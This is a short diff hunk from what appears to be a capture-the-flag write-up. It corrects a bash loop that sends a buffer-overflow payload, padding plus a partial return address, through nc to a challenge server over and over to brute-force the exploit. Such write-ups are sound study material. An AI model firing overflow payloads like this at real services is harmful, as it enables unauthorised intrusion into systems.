@@ -20,7 +20,7 @@ So now it just becomes a brute force game where we continue in hopes that the pa
 ```
 for i in {0..100}
 do
-  python -c "print 'A'*120+'\x67\x75\x08'" nc bx10.allyourbases.co 9015 >> output.txt
+  python -c "print 'A'*120+'\x67\x75\x08'" | nc bx10.allyourbases.co 9015 >> output.txt
 done
 ```
 
